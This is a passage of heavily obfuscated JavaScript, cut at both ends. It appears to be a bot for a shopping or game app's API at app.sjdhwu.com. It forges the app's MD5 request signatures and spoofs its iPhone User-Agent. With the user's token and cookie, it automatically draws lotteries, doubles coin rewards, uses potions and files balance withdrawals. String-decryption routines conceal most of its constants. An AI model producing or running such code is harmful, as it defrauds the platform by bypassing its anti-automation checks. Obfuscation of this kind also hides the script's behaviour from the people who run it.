_0x596a4c={'url':_0x5a464a(0x254),'headers':{'Host':_0x5a464a(0x2f2),'version':'v3','plat':'1','Authorization':'Bearer\x20'+token,'X-Requested-With':_0x185778(0x1b2,'m5@@'),'Accept-Language':_0x185778(0x213,'1]Hw'),'Accept-Encoding':_0x18d5fb(0x2ae),'Accept':_0x185778(0x2be,'mQXD'),'Yw-Number':_0x5a464a(0x323),'User-Agent':_0x5a464a(0x212),'Content-Length':'0','Yw-Sign':_0xe0b220,'Connection':_0x185778(0x1e7,'7C8w'),'Yw-Time':_0x1011b3,'Cookie':cookie,'sign':'1234567890'}};$[_0x5a464a(0x2d5)](_0x596a4c,async(_0x2b388d,_0x1f1fb7,_0x529c06)=>{const _0x52ac5f=_0x18d5fb,_0x4df6eb=_0x185778,_0x576c8b=_0x5a464a;try{const _0x386774=JSON[_0x576c8b(0x1de)](_0x529c06);_0x386774[_0x576c8b(0x1ef)]==0x1f4&&_0x386774[_0x576c8b(0x2ed)]&&(await $[_0x4df6eb(0x304,'Ht0y')](0x1f4),await prizeGet(_0x386774[_0x576c8b(0x2ed)],_0x1011b3)),_0x386774[_0x576c8b(0x1ef)]==0xc8&&(_0x386774[_0x4df6eb(0x311,'FSdR')][_0x4df6eb(0x30e,'%MF5')]==''?console[_0x576c8b(0x25a)](_0x4df6eb(0x268,'1RFV')+_0x386774[_0x576c8b(0x2ed)][_0x52ac5f(0x25c)]):(console[_0x52ac5f(0x299)](_0x576c8b(0x2a0)+_0x386774['data'][_0x4df6eb(0x29c,'!sIE')]),await flopDoubled(_0x386774[_0x52ac5f(0x26e)]['association_id'])),await prizeGet()),_0x386774[_0x576c8b(0x1ef)]==0x1f4&&_0x386774[_0x52ac5f(0x26e)]==null&&console[_0x576c8b(0x25a)]('抽奖失败：',_0x386774[_0x52ac5f(0x315)]);}catch(_0x53af1e){}finally{_0x4605b0();}},_0x31cc6a);});}function freeFlops(_0x4a56ad='',_0x564d2f='',_0x134889=0x0){return new Promise(_0x1166bd=>{const _0x363b23=_0x5f0f,_0x15a673=_0x364d,_0x2eb2e1=_0x4740;let _0x22fb8b=parseInt(Date[_0x2eb2e1(0x2e8)](new Date())/0x3e8),_0x253b38=MD5Encrypt(_0x22fb8b+_0x2eb2e1(0x222)+key+'--'+key)['toUpperCase']();_0x22fb8b=_0x564d2f?_0x564d2f:_0x22fb8b,_0x253b38=_0x4a56ad?_0x4a56ad:_0x253b38;let _0x541116={'url':'https://app.sjdhwu.com/yw_api/v3/freeFlops/','headers':{'Host':_0x15a673(0x285,'pEer'),'version':'v3','plat':'1','Authorization':'Bearer\x20'+token,'X-Requested-With':'XMLHttpRequest','Accept-Language':_0x363b23(0x1ec),'Accept-Encoding':'gzip,\x20deflate,\x20br','Accept':'*/*','Yw-Number':'10470706','User-Agent':'LShopMallProApp/3.1.5\x20(iPhone;\x20iOS\x2014.2;\x20Scale/2.00)','Content-Length':'0','Yw-Sign':_0x253b38,'Connection':_0x363b23(0x1cb),'Yw-Time':_0x22fb8b,'Cookie':cookie,'sign':_0x15a673(0x1db,'tKzs')}};$['post'](_0x541116,async(_0x48c3e0,_0x23adfc,_0x4e8f72)=>{const _0x117820=_0x363b23,_0x323f59=_0x15a673,_0x502516=_0x2eb2e1;try{const _0x419365=JSON['parse'](_0x4e8f72);_0x419365[_0x502516(0x24c)]==0x1f4&&_0x419365[_0x323f59(0x2d6,'%MF5')]&&(await $['wait'](0x1f4),await freeFlops(_0x419365['data'],_0x22fb8b)),_0x419365[_0x117820(0x1ef)]==0xc8&&(console[_0x323f59(0x295,'S#5w')]('增加抽奖次数成功'),await freeFlops()),_0x419365['code']==0x1f4&&_0x419365[_0x502516(0x26e)]==null&&(console[_0x323f59(0x1f3,'mQXD')](_0x117820(0x312),_0x419365['message']),_0x419365[_0x117820(0x201)]==_0x502516(0x289)&&(await $['wait'](0x3c8c),await freeFlops()));}catch(_0x284691){}finally{_0x1166bd();}},_0x134889);});}function flopDoubled(_0x4e4cb7='',_0x140a3d='',_0x762fbe='',_0x3e2ede=0x0){return new Promise(_0x1be78c=>{const _0x2fbf64=_0x364d,_0x5d095c=_0x5f0f;let _0x423a20=parseInt(Date[_0x5d095c(0x1de)](new Date())/0x3e8),_0x7fea34=MD5Encrypt(_0x423a20+'--10470706--'+key+'--'+key)[_0x2fbf64(0x21c,'brj%')]();_0x423a20=_0x762fbe?_0x762fbe:_0x423a20,_0x7fea34=_0x140a3d?_0x140a3d:_0x7fea34;let _0x1686c3={'url':'https://app.sjdhwu.com/yw_api/v3/flopDoubled/','headers':{'Host':_0x5d095c(0x2f2),'version':'v3','plat':'1','Authorization':_0x2fbf64(0x263,'mQXD')+token,'X-Requested-With':_0x5d095c(0x2b5),'Accept-Language':_0x5d095c(0x1ec),'Accept-Encoding':'gzip,\x20deflate,\x20br','Accept':_0x5d095c(0x1b4),'Yw-Number':'10470706','User-Agent':'LShopMallProApp/3.1.5\x20(iPhone;\x20iOS\x2014.2;\x20Scale/2.00)','Content-Type':'application/json','Yw-Sign':_0x7fea34,'Connection':_0x2fbf64(0x1ea,'DgEQ'),'Yw-Time':_0x423a20,'Cookie':cookie,'sign':_0x2fbf64(0x251,'%MF5')},'body':_0x2fbf64(0x1d4,'o]UK')+_0x4e4cb7+'}'};$['post'](_0x1686c3,async(_0x2d859e,_0x2a5ab4,_0x36d89f)=>{const _0x22b940=_0x2fbf64,_0x5aed66=_0x4740,_0x3ba62e=_0x5d095c;try{const _0x29a970=JSON[_0x3ba62e(0x1de)](_0x36d89f);_0x29a970[_0x3ba62e(0x1ef)]==0x1f4&&_0x29a970[_0x5aed66(0x26e)]&&(await $[_0x5aed66(0x260)](0x1f4),await flopDoubled(_0x4e4cb7,_0x29a970[_0x3ba62e(0x2ed)],_0x423a20)),_0x29a970['code']==0xc8&&console[_0x3ba62e(0x25a)](_0x3ba62e(0x330)+_0x29a970[_0x22b940(0x269,'7C8w')][_0x22b940(0x30e,'%MF5')]),_0x29a970[_0x5aed66(0x24c)]==0x1f4&&_0x29a970[_0x22b940(0x23a,'#3][')]==null&&console[_0x3ba62e(0x25a)](_0x5aed66(0x2a1),_0x29a970[_0x5aed66(0x315)]);}catch(_0x14b469){}finally{_0x1be78c();}},_0x3e2ede);});}function myClub(_0x29aea2='',_0x250ff6='',_0x43171b=0x0){return new Promise(_0x236fde=>{const _0x1e84db=_0x364d,_0x2e736b=_0x4740,_0x210019=_0x5f0f;let _0x5430d4=parseInt(Date[_0x210019(0x1de)](new Date())/0x3e8),_0x5130ec=MD5Encrypt(_0x5430d4+_0x2e736b(0x222)+key+'--'+key)['toUpperCase']();_0x5430d4=_0x250ff6?_0x250ff6:_0x5430d4,_0x5130ec=_0x29aea2?_0x29aea2:_0x5130ec;let _0x3383f6={'url':'https://app.sjdhwu.com/yw_api/v3/myClub/','headers':{'Host':_0x210019(0x2f2),'version':'v3','plat':'1','Authorization':_0x1e84db(0x216,'!4a)')+token,'X-Requested-With':_0x2e736b(0x296),'Accept-Language':_0x210019(0x1ec),'Accept-Encoding':_0x1e84db(0x234,'OXjw'),'Accept':_0x2e736b(0x226),'Yw-Number':_0x210019(0x323),'User-Agent':_0x210019(0x212),'Content-Length':'0','Yw-Sign':_0x5130ec,'Connection':_0x1e84db(0x1cd,'B4JJ'),'Yw-Time':_0x5430d4,'Cookie':cookie,'sign':_0x1e84db(0x2c1,'#3][')}};$[_0x2e736b(0x2a4)](_0x3383f6,async(_0x37975e,_0x14648d,_0xc941a8)=>{const _0x4a31b3=_0x2e736b,_0x466219=_0x1e84db,_0x5a6442=_0x210019;try{const _0x79db4f=JSON[_0x5a6442(0x1de)](_0xc941a8);_0x79db4f['code']==0x1f4&&_0x79db4f[_0x466219(0x202,'OXjw')]&&(await $['wait'](0x1f4),await myClub(_0x79db4f[_0x5a6442(0x2ed)],_0x5430d4));if(_0x79db4f[_0x5a6442(0x1ef)]==0xc8){console[_0x4a31b3(0x299)](_0x466219(0x29d,'o]UK'));let _0x20f14b=_0x79db4f[_0x466219(0x2ad,'1]Hw')][_0x4a31b3(0x26e)][0x0];console['log'](_0x5a6442(0x239)+_0x20f14b[_0x4a31b3(0x319)]['name']),await upgradePotionList(_0x20f14b['id']);}_0x79db4f[_0x466219(0x2fa,'o]UK')]==0x1f4&&_0x79db4f[_0x4a31b3(0x26e)]==null&&console[_0x466219(0x20a,'JgR$')](_0x5a6442(0x1e6),_0x79db4f[_0x4a31b3(0x315)]);}catch(_0x1bfb14){}finally{_0x236fde();}},_0x43171b);});}function upgradePotionList(_0x1d23dd='',_0x252a48='',_0x337367='',_0x43cb46=0x0){return new Promise(_0x496738=>{const _0x1ad0c7=_0x364d,_0x57dcb0=_0x5f0f,_0x5f2373=_0x4740;let _0x5b1ea7=parseInt(Date['parse'](new Date())/0x3e8),_0x2ca4d6=MD5Encrypt(_0x5b1ea7+_0x5f2373(0x1bd)+key+_0x57dcb0(0x1e2)+key+key+'page--1'+key)[_0x1ad0c7(0x265,'DG6&')]();_0x5b1ea7=_0x337367?_0x337367:_0x5b1ea7,_0x2ca4d6=_0x252a48?_0x252a48:_0x2ca4d6;let _0x279618={'url':'https://app.sjdhwu.com/yw_api/v3/backpackExperiencePotion?page=1&limit=100','headers':{'Host':_0x57dcb0(0x2f2),'version':'v3','plat':'1','Authorization':_0x5f2373(0x1fe)+token,'X-Requested-With':_0x5f2373(0x296),'Accept-Language':_0x57dcb0(0x1ec),'Accept-Encoding':_0x5f2373(0x2ae),'Accept':_0x5f2373(0x226),'Yw-Number':_0x1ad0c7(0x2d4,'gtdU'),'User-Agent':_0x1ad0c7(0x2f0,'#k73'),'Content-Length':'0','Yw-Sign':_0x2ca4d6,'Connection':'keep-alive','Yw-Time':_0x5b1ea7,'Cookie':cookie,'sign':_0x1ad0c7(0x262,'#k73')}};$['get'](_0x279618,async(_0x578470,_0x24f75e,_0x47148a)=>{const _0x1b5609=_0x5f2373,_0x3962e4=_0x57dcb0,_0x246879=_0x1ad0c7;try{const _0x57e60e=JSON[_0x246879(0x2bc,'7C8w')](_0x47148a);_0x57e60e[_0x3962e4(0x1ef)]==0x1f4&&_0x57e60e[_0x3962e4(0x2ed)]&&(await $[_0x1b5609(0x260)](0x1f4),await upgradePotionList(_0x1d23dd,_0x57e60e[_0x246879(0x317,'i!73')],_0x5b1ea7));if(_0x57e60e['code']==0xc8)for(let _0x130248 of _0x57e60e[_0x3962e4(0x2ed)][_0x3962e4(0x2ed)]){console[_0x1b5609(0x299)]('使用'+_0x130248['number']+'瓶'+_0x130248[_0x246879(0x2e5,'&SeV')]['name']),await playerPotionUpgrade(_0x1d23dd,_0x130248[_0x246879(0x278,'FSdR')]['id'],_0x130248[_0x3962e4(0x23f)]);}_0x57e60e[_0x3962e4(0x1ef)]==0x1f4&&_0x57e60e['data']==null&&console[_0x3962e4(0x25a)](_0x246879(0x1f0,'TDHg'),_0x57e60e[_0x246879(0x288,'bsY@')]);}catch(_0x33721a){}finally{_0x496738();}},_0x43cb46);});}function _0x364d(_0x229408,_0x478b98){const _0x348222=_0x3482();return _0x364d=function(_0x5f0f66,_0x467b7f){_0x5f0f66=_0x5f0f66-0x1b2;let _0x3d92a3=_0x348222[_0x5f0f66];if(_0x364d['FgyRsm']===undefined){var _0x237e62=function(_0x27b4ab){const _0x2d39a3='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x44ff0b='',_0x90c985='';for(let _0x34e517=0x0,_0x444ceb,_0x364dbd,_0xad7b87=0x0;_0x364dbd=_0x27b4ab['charAt'](_0xad7b87++);~_0x364dbd&&(_0x444ceb=_0x34e517%0x4?_0x444ceb*0x40+_0x364dbd:_0x364dbd,_0x34e517++%0x4)?_0x44ff0b+=String['fromCharCode'](0xff&_0x444ceb>>(-0x2*_0x34e517&0x6)):0x0){_0x364dbd=_0x2d39a3['indexOf'](_0x364dbd);}for(let _0x510230=0x0,_0x1d0443=_0x44ff0b['length'];_0x510230<_0x1d0443;_0x510230++){_0x90c985+='%'+('00'+_0x44ff0b['charCodeAt'](_0x510230)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x90c985);};const _0x474073=function(_0x378a53,_0x1a0343){let _0x25d6db=[],_0x4e485c=0x0,_0x54c0b8,_0x1bd0ac='';_0x378a53=_0x237e62(_0x378a53);let _0x3e43b;for(_0x3e43b=0x0;_0x3e43b<0x100;_0x3e43b++){_0x25d6db[_0x3e43b]=_0x3e43b;}for(_0x3e43b=0x0;_0x3e43b<0x100;_0x3e43b++){_0x4e485c=(_0x4e485c+_0x25d6db[_0x3e43b]+_0x1a0343['charCodeAt'](_0x3e43b%_0x1a0343['length']))%0x100,_0x54c0b8=_0x25d6db[_0x3e43b],_0x25d6db[_0x3e43b]=_0x25d6db[_0x4e485c],_0x25d6db[_0x4e485c]=_0x54c0b8;}_0x3e43b=0x0,_0x4e485c=0x0;for(let _0x1b801c=0x0;_0x1b801c<_0x378a53['length'];_0x1b801c++){_0x3e43b=(_0x3e43b+0x1)%0x100,_0x4e485c=(_0x4e485c+_0x25d6db[_0x3e43b])%0x100,_0x54c0b8=_0x25d6db[_0x3e43b],_0x25d6db[_0x3e43b]=_0x25d6db[_0x4e485c],_0x25d6db[_0x4e485c]=_0x54c0b8,_0x1bd0ac+=String['fromCharCode'](_0x378a53['charCodeAt'](_0x1b801c)^_0x25d6db[(_0x25d6db[_0x3e43b]+_0x25d6db[_0x4e485c])%0x100]);}return _0x1bd0ac;};_0x364d['WZPOzs']=_0x474073,_0x229408=arguments,_0x364d['FgyRsm']=!![];}const _0x2acff5=_0x348222[0x0],_0x35908c=_0x5f0f66+_0x2acff5,_0x4e5136=_0x229408[_0x35908c];return!_0x4e5136?(_0x364d['mtQeLr']===undefined&&(_0x364d['mtQeLr']=!![]),_0x3d92a3=_0x364d['WZPOzs'](_0x3d92a3,_0x467b7f),_0x229408[_0x35908c]=_0x3d92a3):_0x3d92a3=_0x4e5136,_0x3d92a3;},_0x364d(_0x229408,_0x478b98);}function playerPotionUpgrade(_0x255045='',_0x44b5f7='',_0x2cf456='',_0x5dc282='',_0x272891='',_0x404dce=0x0){return new Promise(_0x3e5ef5=>{const _0xc8f49e=_0x4740,_0x3c394e=_0x364d,_0x50bed9=_0x5f0f;let _0x28cf3a=parseInt(Date[_0x50bed9(0x1de)](new Date())/0x3e8),_0x5de82c=MD5Encrypt(_0x28cf3a+_0x3c394e(0x2f5,'brj%')+key+_0xc8f49e(0x27e)+_0x44b5f7+key+key+_0x50bed9(0x298)+_0x255045+key+key+_0x50bed9(0x22c)+_0x2cf456+key)['toUpperCase']();_0x28cf3a=_0x272891?_0x272891:_0x28cf3a,_0x5de82c=_0x5dc282?_0x5dc282:_0x5de82c;let _0x3f320e={'url':'https://app.sjdhwu.com/yw_api/v3/playerPotionUpgrade','headers':{'Host':_0x50bed9(0x2f2),'version':'v3','plat':'1','Authorization':'Bearer\x20'+token,'X-Requested-With':'XMLHttpRequest','Accept-Language':_0x3c394e(0x24a,'#k73'),'Accept-Encoding':_0x50bed9(0x1f1),'Accept':'*/*','Yw-Number':_0x50bed9(0x323),'User-Agent':'LShopMallProApp/3.1.5\x20(iPhone;\x20iOS\x2014.2;\x20Scale/2.00)','Content-Type':_0xc8f49e(0x27f),'Yw-Sign':_0x5de82c,'Connection':_0x3c394e(0x2de,'Ht0y'),'Yw-Time':_0x28cf3a,'Cookie':cookie,'sign':_0x3c394e(0x1d0,'30I)')},'body':_0x3c394e(0x2d1,'(2H#')+_0x44b5f7+',\x22member_player_id\x22:'+_0x255045+_0x3c394e(0x1c7,'*%ht')+_0x2cf456+'}'};$[_0xc8f49e(0x21d)](_0x3f320e,async(_0x2a30e1,_0x46498c,_0x33c073)=>{const _0x2be4b6=_0xc8f49e,_0x2783cb=_0x50bed9,_0x4916aa=_0x3c394e;try{const _0x47229e=JSON[_0x4916aa(0x2af,'sg26')](_0x33c073);_0x47229e[_0x2783cb(0x1ef)]==0x1f4&&_0x47229e[_0x2783cb(0x2ed)]&&(await $[_0x2be4b6(0x260)](0x1f4),await playerPotionUpgrade(_0x255045,_0x44b5f7,_0x2cf456,_0x47229e[_0x2783cb(0x2ed)],_0x272891)),_0x47229e['code']==0xc8&&console[_0x2be4b6(0x299)](_0x2be4b6(0x31e)),_0x47229e[_0x2be4b6(0x24c)]==0x1f4&&_0x47229e[_0x2783cb(0x2ed)]==null&&console['log'](_0x4916aa(0x25e,'YpY)'),_0x47229e[_0x2783cb(0x201)]);}catch(_0x5bfc56){}finally{_0x3e5ef5();}},_0x404dce);});}function _0x5f0f(_0x229408,_0x478b98){const _0x348222=_0x3482();return _0x5f0f=function(_0x5f0f66,_0x467b7f){_0x5f0f66=_0x5f0f66-0x1b2;let _0x3d92a3=_0x348222[_0x5f0f66];return _0x3d92a3;},_0x5f0f(_0x229408,_0x478b98);}function balanceWithdrawApply(_0x26ee3c='',_0x2b1d01='',_0x442f23=0x0){return new Promise(_0x3e671e=>{const _0x14e7a5=_0x364d,_0x42b082=_0x4740,_0x2a3d5d=_0x5f0f;let _0x2cfce9=parseInt(Date[_0x2a3d5d(0x1de)](new Date())/0x3e8),_0x4abf51=MD5Encrypt(_0x2cfce9+_0x2a3d5d(0x21b)+key+_0x42b082(0x318)+balance+key+key+_0x14e7a5(0x2a7,'brj%')+name+key)['toUpperCase']();_0x2cfce9=_0x2b1d01?_0x2b1d01:_0x2cfce9,_0x4abf51=_0x26ee3c?_0x26ee3c:_0x4abf51;let _0x36d7a1={'url':'https://app.sjdhwu.com/yw_api/v3/balanceWithdrawApply','headers':{'Host':_0x2a3d5d(0x2f2),'version':'v3','plat':'1','Authorization':_0x42b082(0x1fe)+token,'X-Requested-With':'XMLHttpRequest','Accept-Language':'zh-Hans-US;q=1,\x20zh-Hant-HK;q=0.9','Accept-Encoding':_0x2a3d5d(0x1f1),'Accept':_0x42b082(0x226),'Yw-Number':_0x2a3d5d(0x323),'User-Agent':_0x42b082(0x220),'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8','Yw-Sign':_0x4abf51,'Connection':_0x42b082(0x2a9),'Yw-Time':_0x2cfce9,'Cookie':cookie,'sign':'1234567890'},'body':'money='+balance+_0x2a3d5d(0x31d)+name};$[_0x42b082(0x21d)](_0x36d7a1,async(_0x44da6b,_0x3eef49,_0x3be313)=>{const _0x1aae99=_0x42b082,_0x37af27=_0x14e7a5,_0x128b3f=_0x2a3d5d;try{const _0x1ee069=JSON[_0x128b3f(0x1de)](_0x3be313);_0x1ee069['code']==0x1f4&&_0x1ee069[_0x37af27(0x22a,'vWZr')]&&(await $[_0x1aae99(0x260)](0x1f4),await balanceWithdrawApply(name,_0x1ee069[_0x37af27(0x227,'q@Jw')],_0x2cfce9)),_0x1ee069[_0x37af27(0x1bf,'7C8w')]==0xc8&&console[_0x1aae99(0x299)]('提现：',_0x1ee069[_0x37af27(0x316,'OXjw')]),_0x1ee069['code']==0x1f4&&_0x1ee069['data']==null&&console[_0x37af27(0x1ba,'FBs1')](_0x128b3f(0x1d7),_0x1ee069['message']);}catch(_0x28420a){}finally{_0x3e671e();}},_0x442f23);});}function homeBubbleRewardInformation(_0x4025cc,_0x5a1dea='',_0x34b974='',_0x354264=0x0){return new Promise(_0x5ca4c2=>{const _0x4d7090=_0x4740,_0x3b1f0c=_0x364d,_0xa76b87=_0x5f0f;let _0x26a24a=parseInt(Date[_0xa76b87(0x1de)](new Date())/0x3e8),_0x3e7751=MD5Encrypt(_0x26a24a+_0xa76b87(0x21b)+key+'--'+key)[_0x3b1f0c(0x28c,'m5@@')]();_0x26a24a=_0x34b974?_0x34b974:_0x26a24a,_0x3e7751=_0x5a1dea?_0x5a1dea:_0x3e7751;let _0x3148ce={'url':_0x4d7090(0x1e4),'headers':{'Host':'app.sjdhwu.com','version':'v3','plat':'1','Authorization':_0x3b1f0c(0x32c,'68k1')+token,'X-Requested-With':_0x3b1f0c(0x246,'!sIE'),'Accept-Language':_0xa76b87(0x1ec),'Accept-Encoding':_0x4d7090(0x2ae),'Accept':_0xa76b87(0x1b4),'Yw-Number':'10470706','User-Agent':'LShopMallProApp/3.1.5\x20(iPhone;\x20iOS\x2014.2;\x20Scale/2.00)','Content-Type':_0xa76b87(0x300),'Yw-Sign':_0x3e7751,'Connection':'keep-alive','Yw-Time':_0x26a24a,'Cookie':cookie,'sign':'1234567890'}};$['get'](_0x3148ce,async(_0x1162a7,_0x580128,_0x101b66)=>{const _0x21d890=_0x4d7090,_0x278ce2=_0x3b1f0c;try{const _0x92088c=JSON[_0x278ce2(0x31a,'S#5w')](_0x101b66);_0x92088c['code']==0x1f4&&_0x92088c[_0x278ce2(0x2a8,'&SeV')]&&(await $['wait'](0x1f4),await homeBubbleRewardInformation(_0x4025cc,_0x92088c[_0x278ce2(0x202,'OXjw')],_0x26a24a));if(_0x92088c[_0x278ce2(0x203,'OXjw')]==0xc8)for(let _0x278da3 of _0x92088c[_0x21d890(0x26e)]){await homeBubbleRewardCollection(_0x278da3['type']),await $[_0x21d890(0x260)](0x1f4);}_0x92088c['code']==0x1f4&&_0x92088c[_0x278ce2(0x267,'li%x')]==null&&console[_0x21d890(0x299)](_0x278ce2(0x283,'%MF5'),_0x92088c[_0x21d890(0x315)]);}catch(_0x21c4aa){}finally{_0x5ca4c2();}},_0x354264);});}function homeBubbleRewardCollection(_0x25775e,_0x2f02d7='',_0x3990cf='',_0x403216=0x0){return new Promise(_0x249586=>{const _0x27e0b0=_0x5f0f,_0x458171=_0x4740,_0x531057=_0x364d;let _0x52b363=parseInt(Date[_0x531057(0x25d,'1]Hw')](new Date())/0x3e8),_0x17d4f9=MD5Encrypt(_0x52b363+'--1021148--'+key+_0x458171(0x26b)+_0x25775e+key)[_0x531057(0x28c,'m5@@')]();_0x52b363=_0x3990cf?_0x3990cf:_0x52b363,_0x17d4f9=_0x2f02d7?_0x2f02d7:_0x17d4f9;let _0x3216a6={'url':'https://app.sjdhwu.com/yw_api/v3/homeBubbleRewardCollection','headers':{'Host':_0x27e0b0(0x2f2),'version':'v3','plat':'1','Authorization':'Bearer\x20'+token,'X-Requested-With':_0x531057(0x259,'pgwy'),'Accept-Language':_0x531057(0x303,'B4JJ'),'Accept-Encoding':'gzip,\x20deflate,\x20br','Accept':'*/*','Yw-Number':_0x27e0b0(0x323),'User-Agent':_0x458171(0x220),'Content-Type':_0x531057(0x275,'*%ht'),'Yw-Sign':_0x17d4f9,'Connection':_0x27e0b0(0x1cb),'Yw-Time':_0x52b363,'Cookie':cookie,'sign':'1234567890'},'body':'{\x22type\x22:\x22'+_0x25775e+'\x22}'};$['post'](_0x3216a6,async(_0x118c8c,_0x2b6b95,_0x2c9735)=>{const _0x36343b=_0x531057,_0x50f2d6=_0x27e0b0,_0x29f19a=_0x458171;try{const _0x3f5a79=JSON['parse'](_0x2c9735);_0x3f5a79[_0x29f19a(0x24c)]==0x1f4&&_0x3f5a79[_0x29f19a(0x26e)]&&(await $[_0x50f2d6(0x310)](0x1f4),await homeBubbleRewardCollection(_0x25775e,_0x3f5a79[_0x29f19a(0x26e)],_0x52b363)),_0x3f5a79['code']==0xc8&&(console[_0x29f19a(0x299)](_0x50f2d6(0x286),_0x3f5a79[_0x50f2d6(0x2ed)][_0x50f2d6(0x23f)],'金币'),await homeBubbleRewardsDoubled(_0x3f5a79[_0x50f2d6(0x2ed)]['association_id'])),_0x3f5a79[_0x50f2d6(0x1ef)]==0x1f4&&_0x3f5a79[_0x29f19a(0x26e)]==null&&console['log'](_0x29f19a(0x294),_0x3f5a79[_0x36343b(0x2ff,'*%ht')]);}catch(_0x24fdb6){}finally{_0x249586();}},_0x403216);});}function homeBubbleRewardsDoubled(_0x920eb7,_0xd977e3='',_0x32d042='',_0x200c2e=0x0){return new Promise(_0x5244ce=>{const _0x4c61aa=_0x4740,_0x54899a=_0x5f0f,_0x274c77=_0x364d;let _0x3f23cc=parseInt(Date[_0x274c77(0x24e,'o]UK')](new Date())/0x3e8),_0x1adc64=MD5Encrypt(_0x3f23cc+'--1021148--'+key+'association_id--'+_0x920eb7+key)['toUpperCase']();_0x3f23cc=_0x32d042?_0x32d042:_0x3f23cc,_0x1adc64=_0xd977e3?_0xd977e3:_0x1adc64;let _0x15cbea={'url':_0x54899a(0x237),'headers':{'Host':'app.sjdhwu.com','version':'v3','plat':'1','Authorization':_0x54899a(0x306)+token,'X-Requested-With':_0x54899a(0x2b5),'Accept-Language':'zh-Hans-US;q=1,\x20zh-Hant-HK;q=0.9','Accept-Encoding':'gzip,\x20deflate,\x20br','Accept':_0x4c61aa(0x226),'Yw-Number':'10470706','User-Agent':_0x4c61aa(0x220),'Content-Type':_0x4c61aa(0x27f),'Yw-Sign':_0x1adc64,'Connection':_0x54899a(0x1cb),'Yw-Time':_0x3f23cc,'Cookie':cookie,'sign':_0x4c61aa(0x245)},'body':_0x4c61aa(0x32b)+_0x920eb7+'\x22}'};$[_0x54899a(0x2f3)](_0x15cbea,async(_0x40a455,_0x57697b,_0x3ce057)=>{const _0x16deaa=_0x54899a,_0xbf13dc=_0x4c61aa,_0x2d7cd8=_0x274c77;try{const _0x4ff5ba=JSON[_0x2d7cd8(0x2b3,'#3][')](_0x3ce057);_0x4ff5ba['code']==0x1f4&&_0x4ff5ba[_0xbf13dc(0x26e)]&&(await $[_0x16deaa(0x310)](0x1f4),await homeBubbleRewardsDoubled(_0x920eb7,_0x4ff5ba[_0x16deaa(0x2ed)],_0x3f23cc)),_0x4ff5ba[_0x2d7cd8(0x2fe,'%MF5')]==0xc8&&console[_0x16deaa(0x25a)](_0xbf13dc(0x1d6),_0x4ff5ba[_0xbf13dc(0x315)]),_0x4ff5ba[_0x2d7cd8(0x2ab,'@IX2')]==0x1f4&&_0x4ff5ba[_0xbf13dc(0x26e)]==null&&console[_0x2d7cd8(0x224,'B4JJ')](_0x2d7cd8(0x229,'li%x'),_0x4ff5ba[_0x2d7cd8(0x217,'FBs1')]);}catch(_0x2fa323){}finally{_0x5244ce();}},_0x200c2e);});}

function MD5Encrypt(a) { function b(a, b) { return a << b | a >>> 32 - b } function c(a, b) { var c, d, e, f, g; return e = 2147483648 & a, f = 2147483648 & b, c = 1073741824 & a, d = 1073741824 & b, g = (1073741823 & a) + (1073741823 & b), c & d ? 2147483648 ^ g ^ e ^ f : c | d ? 1073741824 & g ? 3221225472 ^ g ^ e ^ f : 1073741824 ^ g ^ e ^ f : g ^ e ^ f } function d(a, b, c) { return a & b | ~a & c } function e(a, b, c) { return a & c | b & ~c } function f(a, b, c) { return a ^ b ^ c } function g(a, b, c) { return b ^ (a | ~c) } function h(a, e, f, g, h, i, j) { return a = c(a, c(c(d(e, f, g), h), j)), c(b(a, i), e) } function i(a, d, f, g, h, i, j) { return a = c(a, c(c(e(d, f, g), h), j)), c(b(a, i), d) } function j(a, d, e, g, h, i, j) { return a = c(a, c(c(f(d, e, g), h), j)), c(b(a, i), d) } function k(a, d, e, f, h, i, j) { return a = c(a, c(c(g(d, e, f), h), j)), c(b(a, i), d) } function l(a) { for (var b, c = a.length, d = c + 8, e = (d - d % 64) / 64, f = 16 * (e + 1), g = new Array(f - 1), h = 0, i = 0; c > i;)b = (i - i % 4) / 4, h = i % 4 * 8, g[b] = g[b] | a.charCodeAt(i) << h, i++; return b = (i - i % 4) / 4, h = i % 4 * 8, g[b] = g[b] | 128 << h, g[f - 2] = c << 3, g[f - 1] = c >>> 29, g } function m(a) { var b, c, d = "", e = ""; for (c = 0; 3 >= c; c++)b = a >>> 8 * c & 255, e = "0" + b.toString(16), d += e.substr(e.length - 2, 2); return d } function n(a) { a = a.replace(/\r\n/g, "\n"); for (var b = "", c = 0; c < a.length; c++) { var d = a.charCodeAt(c); 128 > d ? b += String.fromCharCode(d) : d > 127 && 2048 > d ? (b += String.fromCharCode(d >> 6 | 192), b += String.fromCharCode(63 & d | 128)) : (b += String.fromCharCode(d >> 12 | 224), b += String.fromCharCode(d >> 6 & 63 | 128), b += String.fromCharCode(63 & d | 128)) } return b } var o, p, q, r, s, t, u, v, w, x = [], y = 7, z = 12, A = 17, B = 22, C = 5, D = 9, E = 14, F = 20, G = 4, H = 11, I = 16, J = 23, K = 6, L = 10, M = 15, N = 21; for (a = n(a), x = l(a), t = 1732584193, u = 4023233417, v = 2562383102, w = 271733878, o = 0; o < x.length; o += 16)p = t, q = u, r = v, s = w, t = h(t, u, v, w, x[o + 0], y, 3614090360), w = h(w, t, u, v, x[o + 1], z, 3905402710), v = h(v, w, t, u, x[o + 2], A, 606105819), u = h(u, v, w, t, x[o + 3], B, 3250441966), t = h(t, u, v, w, x[o + 4], y, 4118548399), w = h(w, t, u, v, x[o + 5], z, 1200080426), v = h(v, w, t, u, x[o + 6], A, 2821735955), u = h(u, v, w, t, x[o + 7], B, 4249261313), t = h(t, u, v, w, x[o + 8], y, 1770035416), w = h(w, t, u, v, x[o + 9], z, 2336552879), v = h(v, w, t, u, x[o + 10], A, 4294925233), u = h(u, v, w, t, x[o + 11], B, 2304563134), t = h(t, u, v, w, x[o + 12], y, 1804603682), w = h(w, t, u, v, x[o + 13], z, 4254626195), v = h(v, w, t, u, x[o + 14], A, 2792965006), u = h(u, v, w, t, x[o + 15], B, 1236535329), t = i(t, u, v, w, x[o + 1], C, 4129170786), w = i(w, t, u, v, x[o + 6], D, 3225465664), v = i(v, w, t, u, x[o + 11], E, 643717713), u = i(u, v, w, t, x[o + 0], F, 3921069994), t = i(t, u, v, w, x[o + 5], C, 3593408605), w = i(w, t, u, v, x[o + 10], D, 38016083), v = i(v, w, t, u, x[o + 15], E, 3634488961), u = i(u, v, w, t, x[o + 4], F, 3889429448), t = i(t, u, v, w, x[o + 9], C, 568446438), w = 